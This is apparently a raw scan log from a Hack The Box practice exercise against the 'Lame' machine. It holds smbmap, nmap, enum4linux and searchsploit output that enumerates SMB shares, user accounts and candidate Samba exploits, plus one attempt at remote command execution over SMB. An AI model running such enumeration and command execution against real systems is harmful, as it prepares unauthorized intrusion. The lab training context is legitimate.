[+] IP: 10.129.187.154:139	Name: 10.129.187.154                                    
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
[!] RPC Authentication error occurred
[!] Authentication error on 10.129.187.154

```

`smbmap -H 10.129.187.154 -P 139 -R 2>&1 | tee -a /home/bernhard/htb/lame/scans/tcp_139_smb-smbmap-list-contents.txt; smbmap -u null -p "" -H 10.129.187.154 -P 139 -R 2>&1`

```
[\] Working on it...
[+] IP: 10.129.187.154:139	Name: 10.129.187.154                                    
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	.\tmp\*
	dr--r--r--                0 Tue Aug 17 07:26:18 2021	.
	dw--w--w--                0 Sat Oct 31 07:33:57 2020	..
	fw--w--w--                0 Mon Aug 16 15:07:45 2021	5580.jsvc_up
	dr--r--r--                0 Mon Aug 16 15:06:31 2021	.ICE-unix
	dw--w--w--                0 Mon Aug 16 15:07:02 2021	vmware-root
	dr--r--r--                0 Mon Aug 16 15:06:57 2021	.X11-unix
	fw--w--w--               11 Mon Aug 16 15:06:57 2021	.X0-lock
	fw--w--w--             1600 Mon Aug 16 15:06:29 2021	vgauthsvclog.txt.0
	.\tmp\.X11-unix\*
	dr--r--r--                0 Mon Aug 16 15:06:57 2021	.
	dr--r--r--                0 Tue Aug 17 07:26:18 2021	..
	fr--r--r--                0 Mon Aug 16 15:06:57 2021	X0
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
[!] RPC Authentication error occurred
[!] Authentication error on 10.129.187.154

```

`smbmap -H 10.129.187.154 -P 139 -x "ipconfig /all" 2>&1 | tee -a /home/bernhard/htb/lame/scans/tcp_139_smb-smbmap-execute-command.txt; smbmap -u null -p "" -H 10.129.187.154 -P 139 -x "ipconfig /all" 2>&1`

```
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
[!] RPC Authentication error occurred
[!] Authentication error on 10.129.187.154

```

## Port 445/tcp

`nmap -vv --reason -Pn -sV -p 445 --script='banner,(nbstat or smb* or samba* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' --script-args='unsafe=1' -oA /home/bernhard/htb/lame/scans/tcp_445_nmap 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 08:00 CEST
NSE: Loaded 85 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:00
Completed Parallel DNS resolution of 1 host. at 08:00, 0.02s elapsed
Initiating SYN Stealth Scan at 08:00
Scanning 10.129.187.154 [1 port]
Discovered open port 445/tcp on 10.129.187.154
Completed SYN Stealth Scan at 08:00, 0.08s elapsed (1 total ports)
Initiating Service scan at 08:00
Scanning 1 service on 10.129.187.154
Completed Service scan at 08:00, 6.17s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.187.154.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:00
NSE Timing: About 87.32% done; ETC: 08:00 (0:00:05 remaining)
NSE Timing: About 95.77% done; ETC: 08:01 (0:00:03 remaining)
NSE Timing: About 95.77% done; ETC: 08:01 (0:00:04 remaining)
NSE Timing: About 97.18% done; ETC: 08:02 (0:00:04 remaining)
NSE Timing: About 97.18% done; ETC: 08:02 (0:00:04 remaining)
NSE Timing: About 98.59% done; ETC: 08:03 (0:00:03 remaining)
NSE Timing: About 98.59% done; ETC: 08:03 (0:00:03 remaining)
NSE Timing: About 98.59% done; ETC: 08:04 (0:00:03 remaining)
NSE Timing: About 98.59% done; ETC: 08:04 (0:00:04 remaining)
NSE Timing: About 98.59% done; ETC: 08:05 (0:00:04 remaining)
NSE Timing: About 98.59% done; ETC: 08:05 (0:00:05 remaining)
NSE Timing: About 98.59% done; ETC: 08:06 (0:00:05 remaining)
Completed NSE at 08:06, 377.72s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:06
NSE Timing: About 92.31% done; ETC: 08:07 (0:00:03 remaining)
NSE Timing: About 92.31% done; ETC: 08:07 (0:00:05 remaining)
Completed NSE at 08:07, 71.91s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Nmap scan report for 10.129.187.154
Host is up, received user-set (0.031s latency).
Scanned at 2021-08-17 08:00:09 CEST for 457s

PORT    STATE SERVICE     REASON         VERSION
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.129.187.154\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.187.154\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.129.187.154\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.187.154\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.129.187.154\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
| smb-enum-users: 
|   LAME\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   LAME\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
|   LAME\bind (RID: 1210)
|     Flags:       Account disabled, Normal user account
|   LAME\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Account disabled, Normal user account
|   LAME\dhcp (RID: 1202)
|     Flags:       Account disabled, Normal user account
|   LAME\distccd (RID: 1222)
|     Flags:       Account disabled, Normal user account
|   LAME\ftp (RID: 1214)
|     Flags:       Account disabled, Normal user account
|   LAME\games (RID: 1010)
|     Full name:   games
|     Flags:       Account disabled, Normal user account
|   LAME\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Account disabled, Normal user account
|   LAME\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Account disabled, Normal user account
|   LAME\klog (RID: 1206)
|     Flags:       Account disabled, Normal user account
|   LAME\libuuid (RID: 1200)
|     Flags:       Account disabled, Normal user account
|   LAME\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Account disabled, Normal user account
|   LAME\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Account disabled, Normal user account
|   LAME\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Account disabled, Normal user account
|   LAME\man (RID: 1012)
|     Full name:   man
|     Flags:       Account disabled, Normal user account
|   LAME\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   LAME\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Account disabled, Normal user account
|   LAME\news (RID: 1018)
|     Full name:   news
|     Flags:       Account disabled, Normal user account
|   LAME\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Account disabled, Normal user account
|   LAME\postfix (RID: 1212)
|     Flags:       Account disabled, Normal user account
|   LAME\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Account disabled, Normal user account
|   LAME\proftpd (RID: 1226)
|     Flags:       Account disabled, Normal user account
|   LAME\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Account disabled, Normal user account
|   LAME\root (RID: 1000)
|     Full name:   root
|     Flags:       Account disabled, Normal user account
|   LAME\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Account disabled, Normal user account
|   LAME\sshd (RID: 1208)
|     Flags:       Account disabled, Normal user account
|   LAME\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Account disabled, Normal user account
|   LAME\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Account disabled, Normal user account
|   LAME\syslog (RID: 1204)
|     Flags:       Account disabled, Normal user account
|   LAME\telnetd (RID: 1224)
|     Flags:       Account disabled, Normal user account
|   LAME\tomcat55 (RID: 1220)
|     Flags:       Account disabled, Normal user account
|   LAME\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   LAME\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Account disabled, Normal user account
|   LAME\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Account disabled, Normal user account
| smb-ls: Volume \\10.129.187.154\tmp
| SIZE   TIME                 FILENAME
| <DIR>  2021-08-17T06:04:21  .
| <DIR>  2020-10-31T06:33:58  ..
| 0      2021-08-16T13:07:46  5580.jsvc_up
| <DIR>  2021-08-16T13:06:29  vmware-root
| 1600   2021-08-16T13:06:29  vgauthsvclog.txt.0
|_
| smb-mbenum: 
|   Master Browser
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Print server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Server service
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Unix server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Windows NT/2000/XP/2003 server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Workstation
|_    LAME  0.0  lame server (Samba 3.0.20-Debian)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-08-17T02:02:06-04:00
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false
|_smb2-capabilities: Couldn't establish a SMBv2 connection.
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 456.91 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)

```

`nmap -vv --reason -Pn -sV -p 445 --script=samba-vuln-cve-2012-1182 -oA /home/bernhard/htb/lame/scans/tcp_445_nmap-cve-2012-1182 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 08:14 CEST
NSE: Loaded 46 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:14
Completed Parallel DNS resolution of 1 host. at 08:14, 0.01s elapsed
Initiating SYN Stealth Scan at 08:14
Scanning 10.129.187.154 [1 port]
Discovered open port 445/tcp on 10.129.187.154
Completed SYN Stealth Scan at 08:14, 0.07s elapsed (1 total ports)
Initiating Service scan at 08:14
Scanning 1 service on 10.129.187.154
Completed Service scan at 08:14, 6.18s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.187.154.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 1.79s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Nmap scan report for 10.129.187.154
Host is up, received user-set (0.038s latency).
Scanned at 2021-08-17 08:14:50 CEST for 8s

PORT    STATE SERVICE     REASON         VERSION
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)

```

`searchsploit --colour "samba"`

```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                                                                                                     | php/webapps/4575.txt
Inteno IOPSYS 3.16.4 - root filesystem access via sambashare (Authenticated)                                                                                                                       | hardware/webapps/49438.py
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)                                                                                                                    | windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow                                                                                                                                                   | linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                                                                                                                                                             | linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                                                                                                                                                                 | unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                                                                                                                                                                     | linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                                                                                                                                                                     | linux/local/20339.sh
Samba 2.0.x - Insecure TMP File Symbolic Link                                                                                                                                                      | linux/local/20776.c
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                                                          | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                       | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                                            | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                  | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                    | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                  | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                            | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                                          | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                                                         | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                                                         | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                                                         | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                                                         | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                                               | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                                                            | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                                                                                               | linux/remote/7.pl
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                               | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                             | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                   | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                                                                 | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                             | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                           | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                                                           | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                                                                  | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                                                                   | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                                                                                            | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                                                                                      | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                                                        | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                                                                                          | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                                                             | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                                                              | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                                                                                                | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                                                       | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                                                         | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                                                         | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                                                                                           | multiple/remote/41740.txt
Samba < 2.0.5 - Local Overflow                                                                                                                                                                     | linux/local/19428.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                  | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                              | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                      | linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                                                                                            | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                                                                                                              | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                                                                                                               | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                                                          | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                                                                                                 | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                                                                                                       | multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Service                                                                                                                                                | windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure                                                                                                                                                       | cgi/remote/21390.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scripting                                                                                                                                             | windows/remote/22185.txt
Sambar Server 5.x - Information Disclosure                                                                                                                                                         | windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication Bypass                                                                                                                                             | windows/remote/24076.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                                                                                           | windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site Scripting                                                                                                                                 | windows/remote/25695.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scripting                                                                                                                                    | windows/remote/25696.txt
Sambar Server 6 - Search Results Buffer Overflow (Metasploit)                                                                                                                                      | windows/remote/16756.rb
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                                                                                             | windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scripting                                                                                                                                    | windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                                                                                     | windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scripting                                                                                                                               | windows/remote/24162.txt
SWAT Samba Web Administration Tool - Cross-Site Request Forgery                                                                                                                                    | cgi/webapps/17577.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

`searchsploit --colour "samba 3."`

```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Inteno IOPSYS 3.16.4 - root filesystem access via sambashare (Authenticated)                                                                                                                       | hardware/webapps/49438.py
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                               | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                             | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                   | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                                                                 | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                             | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                           | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                                                           | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                                                                  | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                                                                   | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                                                                                            | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                                                                                      | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                                                        | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                                                                                          | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                                                             | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                                                              | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                                                                                                | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                                                       | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                                                         | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                                                         | linux/dos/27778.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                              | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                              | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                      | linux_x86/dos/36741.py
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                                                          | windows/remote/20223.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                                                                                     | windows/remote/24163.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

`enum4linux -a -M -l -d 10.129.187.154 2>&1`

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug 17 07:33:32 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.187.154
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 10.129.187.154    |
 ====================================================== 
[E] Can't find workgroup/domain


 ============================================== 
|    Nbtstat Information for 10.129.187.154    |
 ============================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
Looking up status of 10.129.187.154
No reply from 10.129.187.154

 ======================================= 
|    Session Check on 10.129.187.154    |
 ======================================= 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

```

`nbtscan -rvh 10.129.187.154 2>&1`

```
Doing NBT name scan for addresses from 10.129.187.154


```

`smbclient -L\ -N -I 10.129.187.154 2>&1`

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

```

`smbmap -H 10.129.187.154 -P 445 2>&1 | tee -a /home/bernhard/htb/lame/scans/tcp_445_smb-smbmap-share-permissions.txt; smbmap -u null -p "" -H 10.129.187.154 -P 445 2>&1`

```
[\] Working on it...
[+] IP: 10.129.187.154:445	Name: 10.129.187.154                                    
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
[!] Authentication error on 10.129.187.154

```

`smbmap -H 10.129.187.154 -P 445 -R 2>&1 | tee -a /home/bernhard/htb/lame/scans/tcp_445_smb-smbmap-list-contents.txt; smbmap -u null -p "" -H 10.129.187.154 -P 445 -R 2>&1`

```
[\] Working on it...
[+] IP: 10.129.187.154:445	Name: 10.129.187.154                                    
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	.\tmp\*
	dr--r--r--                0 Tue Aug 17 07:35:27 2021	.
	dw--w--w--                0 Sat Oct 31 07:33:57 2020	..
	fw--w--w--                0 Mon Aug 16 15:07:45 2021	5580.jsvc_up
